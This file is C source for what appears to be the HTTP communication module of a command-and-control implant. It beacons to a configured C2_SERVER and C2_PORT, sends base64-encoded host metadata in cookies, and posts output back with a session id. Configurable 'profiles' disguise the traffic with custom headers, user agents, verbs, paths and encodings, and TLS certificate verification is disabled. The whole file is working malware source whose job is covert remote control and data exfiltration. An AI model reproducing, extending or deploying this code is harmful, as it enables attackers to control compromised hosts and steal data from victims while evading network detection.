#include "http.h"
#include "crypto.h"
#include "config.h"
#include "transform.h"
#include "url_builder.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include "debug.h"

static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t real_size = size * nmemb;
    http_response_t *response = (http_response_t *)userp;
    
    char *new_data = realloc(response->data, response->size + real_size + 1);
    if (!new_data) {
        return 0;
    }
    
    response->data = new_data;
    memcpy(response->data + response->size, contents, real_size);
    response->size += real_size;
    response->data[response->size] = 0;
    
    return real_size;
}

static void setup_curl_base(CURL *curl, const char *url, struct curl_slist *headers,
                            http_response_t *response)
{
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_ACCEPT_ENCODING, "");

    if (strncmp(url, "https://", 8) == 0) {
        #if C2_USE_HTTPS == 1
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        #else
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
        #endif
    }
}

void profile_merge_cookie_header(struct curl_slist **headers, const char *new_value)
{
    if (!headers || !new_value) return;

    struct curl_slist *curr = *headers;
    while (curr) {
        if (strncasecmp(curr->data, "Cookie:", 7) == 0) {
            const char *existing = curr->data + 7;
            while (*existing == ' ') existing++;
            char merged[4096];
            snprintf(merged, sizeof(merged), "Cookie: %s; %s", existing, new_value);
            free(curr->data);
            curr->data = strdup(merged);
            return;
        }
        curr = curr->next;
    }
    char buf[4096];
    snprintf(buf, sizeof(buf), "Cookie: %s", new_value);
    *headers = curl_slist_append(*headers, buf);
}

struct curl_slist* profile_build_headers(const c2_profile_t *profile, int is_post)
{
    struct curl_slist *headers = NULL;
    
    const profile_header_t *hdrs = is_post ? profile->post_headers : profile->get_headers;
    int count = is_post ? profile->post_header_count : profile->get_header_count;

    for (int i = 0; i < count; i++) {
        if (strcasecmp(hdrs[i].name, "Accept-Encoding") == 0) {
            continue;
        }
        char buf[2048];
        snprintf(buf, sizeof(buf), "%s: %s", hdrs[i].name, hdrs[i].value);
        headers = curl_slist_append(headers, buf);
    }

    char ua_header[512];
    snprintf(ua_header, sizeof(ua_header), "User-Agent: %s", profile->user_agent);
    headers = curl_slist_append(headers, ua_header);

    return headers;
}

int http_get(const char *uri,
             const uint8_t *metadata,
             size_t metadata_len,
             http_response_t *response)
{
    CURL *curl;
    CURLcode res;
    long response_code;

    response->data = NULL;
    response->size = 0;

    curl = curl_easy_init();
    if (!curl) {
        ERROR_PRINT("Failed to initialize CURL\n");
        return -1;
    }

    char url[512];
    #if C2_USE_HTTPS == 0
    snprintf(url, sizeof(url), "http://%s:%d%s", C2_SERVER, C2_PORT, uri);
    #else
    snprintf(url, sizeof(url), "https://%s:%d%s", C2_SERVER, C2_PORT, uri);
    #endif

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, HTTP_ACCEPT_HEADER);
    headers = curl_slist_append(headers, HTTP_CONNECTION_HEADER);
    headers = curl_slist_append(headers, HTTP_CACHE_CONTROL_HEADER);

    char ua_header[512];
    snprintf(ua_header, sizeof(ua_header), "User-Agent: %s", USER_AGENT);
    headers = curl_slist_append(headers, ua_header);

    if (metadata && metadata_len > 0) {
        char *b64_metadata = base64_encode(metadata, metadata_len);
        if (!b64_metadata) {
            ERROR_PRINT("Failed to base64 encode metadata\n");
            curl_slist_free_all(headers);
            curl_easy_cleanup(curl);
            return -1;
        }
        char cookie_header[4096];
        snprintf(cookie_header, sizeof(cookie_header), "Cookie: %s", b64_metadata);
        headers = curl_slist_append(headers, cookie_header);
        free(b64_metadata);
    }

    setup_curl_base(curl, url, headers, response);

    res = curl_easy_perform(curl);
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) {
        ERROR_PRINT("CURL error: %s\n", curl_easy_strerror(res));
        free(response->data);
        response->data = NULL;
        return -1;
    }

    if (response_code != 200) {
        ERROR_PRINT("Server returned HTTP %ld\n", response_code);
    }

    return 0;
}

int http_post(const char *uri, const uint8_t *data, size_t data_len,
              const char *session_id, http_response_t *response) {

    CURL *curl;
    CURLcode res;
    long response_code;
    
    response->data = NULL;
    response->size = 0;
    
    curl = curl_easy_init();
    if (!curl) {
        ERROR_PRINT("Failed to initialize CURL\n");
        return -1;
    }
    
    char url[512];
    #if C2_USE_HTTPS == 0
    snprintf(url, sizeof(url), "http://%s:%d%s?id=%s", C2_SERVER, C2_PORT, uri, session_id);
    #else
    snprintf(url, sizeof(url), "https://%s:%d%s?id=%s", C2_SERVER, C2_PORT, uri, session_id);
    #endif
    
    DEBUG_PRINT("POST URL: %s\n", url);
    DEBUG_PRINT("POST data length: %zu bytes\n", data_len);
    
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
    
    char ua_header[512];
    snprintf(ua_header, sizeof(ua_header), "User-Agent: %s", USER_AGENT);
    headers = curl_slist_append(headers, ua_header);
    
    setup_curl_base(curl, url, headers, response);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)data_len);
    
    res = curl_easy_perform(curl);
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
    DEBUG_PRINT("HTTP Response Code: %ld\n", response_code);
    DEBUG_PRINT("Response size: %zu bytes\n", response->size);
    
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    
    if (res != CURLE_OK) {
        ERROR_PRINT("CURL error: %s\n", curl_easy_strerror(res));
        if (response->data) {
            free(response->data);
            response->data = NULL;
        }
        return -1;
    }
    
    if (response_code != 200) {
        ERROR_PRINT("Server returned HTTP %ld\n", response_code);
    }
    
    return 0;
}

int http_profile_get(const c2_profile_t *profile, const uint8_t *metadata, size_t metadata_len, http_response_t *response)
{
    CURL *curl;
    CURLcode res;
    long response_code;

    response->data = NULL;
    response->size = 0;

    curl = curl_easy_init();
    if (!curl) {
        ERROR_PRINT("Failed to initialize CURL\n");
        return -1;
    }

    url_builder_t ub;
    char base[512];
    #if C2_USE_HTTPS == 0
    snprintf(base, sizeof(base), "http://%s:%d", C2_SERVER, C2_PORT);
    #else
    snprintf(base, sizeof(base), "https://%s:%d", C2_SERVER, C2_PORT);
    #endif
    url_builder_init(&ub, base);
    url_builder_append_path(&ub, profile->selected_get_uri);

    struct curl_slist *headers = profile_build_headers(profile, 0);

    if (metadata && metadata_len > 0) {
        size_t encoded_len = 0;
        uint8_t *encoded = transform_encode(metadata, metadata_len, &profile->metadata_transform, &encoded_len);
        if (!encoded) {
            curl_slist_free_all(headers);
            curl_easy_cleanup(curl);
            return -1;
        }

        const transform_chain_t *chain = &profile->metadata_transform;
        switch (chain->terminator) {
        case TERMINATOR_HEADER: {
            char hdr_val[4096];
            snprintf(hdr_val, sizeof(hdr_val), "%s: %.*s",
                     chain->terminator_arg ? chain->terminator_arg : "Cookie",
                     (int)encoded_len, (char*)encoded);
            if (strcasecmp(chain->terminator_arg ? chain->terminator_arg : "Cookie", "Cookie") == 0) {
                char cookie_val[4096];
                snprintf(cookie_val, sizeof(cookie_val), "%.*s", (int)encoded_len, (char*)encoded);
                profile_merge_cookie_header(&headers, cookie_val);
            } else {
                headers = curl_slist_append(headers, hdr_val);
            }
            break;
        }
        case TERMINATOR_PARAMETER: {
            char val_buf[4096];
            snprintf(val_buf, sizeof(val_buf), "%.*s", (int)encoded_len, (char*)encoded);
            url_builder_add_param(&ub, chain->terminator_arg ? chain->terminator_arg : "id", val_buf);
            break;
        }
        case TERMINATOR_URI_APPEND: {
            char seg[4096];
            snprintf(seg, sizeof(seg), "%.*s", (int)encoded_len, (char*)encoded);
            url_builder_append_path(&ub, seg);
            break;
        }
        case TERMINATOR_PRINT:
            break;
        }

        free(encoded);
    }

    const char *url = url_builder_get(&ub);
    setup_curl_base(curl, url, headers, response);

    if (profile->get_verb && strcmp(profile->get_verb, "GET") != 0) {
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, profile->get_verb);
    }

    res = curl_easy_perform(curl);
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) {
        ERROR_PRINT("CURL error: %s\n", curl_easy_strerror(res));
        free(response->data);
        response->data = NULL;
        return -1;
    }

    if (response_code != 200) {
        ERROR_PRINT("Server returned HTTP %ld\n", response_code);
    }

    return 0;
}

int http_profile_post(const c2_profile_t *profile, const uint8_t *data, size_t data_len,
                      const uint8_t *id_data, size_t id_data_len, http_response_t *response)
{
    CURL *curl;
    CURLcode res;
    long response_code;

    response->data = NULL;
    response->size = 0;

    curl = curl_easy_init();
    if (!curl) {
        ERROR_PRINT("Failed to initialize CURL\n");
        return -1;
    }

    url_builder_t ub;
    char base[512];
    #if C2_USE_HTTPS == 0
    snprintf(base, sizeof(base), "http://%s:%d", C2_SERVER, C2_PORT);
    #else
    snprintf(base, sizeof(base), "https://%s:%d", C2_SERVER, C2_PORT);
    #endif
    url_builder_init(&ub, base);
    url_builder_append_path(&ub, profile->selected_post_uri);

    struct curl_slist *headers = profile_build_headers(profile, 1);

    if (id_data && id_data_len > 0) {
        size_t id_encoded_len = 0;
        uint8_t *id_encoded = transform_encode(id_data, id_data_len, &profile->id_transform, &id_encoded_len);
        if (id_encoded) {
            const transform_chain_t *id_chain = &profile->id_transform;
            switch (id_chain->terminator) {
            case TERMINATOR_HEADER: {
                char hdr_val[4096];
                snprintf(hdr_val, sizeof(hdr_val), "%s: %.*s",
                         id_chain->terminator_arg ? id_chain->terminator_arg : "Cookie",
                         (int)id_encoded_len, (char*)id_encoded);
                if (strcasecmp(id_chain->terminator_arg ? id_chain->terminator_arg : "Cookie", "Cookie") == 0) {
                    char cookie_val[4096];
                    snprintf(cookie_val, sizeof(cookie_val), "%.*s", (int)id_encoded_len, (char*)id_encoded);
                    profile_merge_cookie_header(&headers, cookie_val);
                } else {
                    headers = curl_slist_append(headers, hdr_val);
                }
                break;
            }
            case TERMINATOR_PARAMETER: {
                char val_buf[4096];
                snprintf(val_buf, sizeof(val_buf), "%.*s", (int)id_encoded_len, (char*)id_encoded);
                url_builder_add_param(&ub, id_chain->terminator_arg ? id_chain->terminator_arg : "id", val_buf);
                break;
            }
            case TERMINATOR_URI_APPEND: {
                char seg[4096];
                snprintf(seg, sizeof(seg), "%.*s", (int)id_encoded_len, (char*)id_encoded);
                url_builder_append_path(&ub, seg);
                break;
            }
            case TERMINATOR_PRINT:
                break;
            }
            free(id_encoded);
        }
    }

    size_t output_encoded_len = 0;
    uint8_t *output_encoded = NULL;

    if (data && data_len > 0) {
        output_encoded = transform_encode(data, data_len, &profile->output_transform, &output_encoded_len);
        if (!output_encoded) {
            curl_slist_free_all(headers);
            curl_easy_cleanup(curl);
            return -1;
        }
    }

    const char *url = url_builder_get(&ub);
    setup_curl_base(curl, url, headers, response);

    if (profile->post_verb && strcmp(profile->post_verb, "POST") == 0) {
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
    } else if (profile->post_verb) {
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, profile->post_verb);
    } else {
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
    }

    if (output_encoded && output_encoded_len > 0) {
        const transform_chain_t *out_chain = &profile->output_transform;
        if (out_chain->terminator == TERMINATOR_PRINT) {
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, output_encoded);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)output_encoded_len);
        }
    }

    res = curl_easy_perform(curl);
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);

    DEBUG_PRINT("HTTP Response Code: %ld\n", response_code);
    DEBUG_PRINT("Response size: %zu bytes\n", response->size);

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    free(output_encoded);

    if (res != CURLE_OK) {
        ERROR_PRINT("CURL error: %s\n", curl_easy_strerror(res));
        if (response->data) {
            free(response->data);
            response->data = NULL;
        }
        return -1;
    }

    if (response_code != 200) {
        ERROR_PRINT("Server returned HTTP %ld\n", response_code);
    }

    return 0;
}

void http_response_free(http_response_t *response) {
    if (response->data) {
        free(response->data);
        response->data = NULL;
    }
    response->size = 0;
}
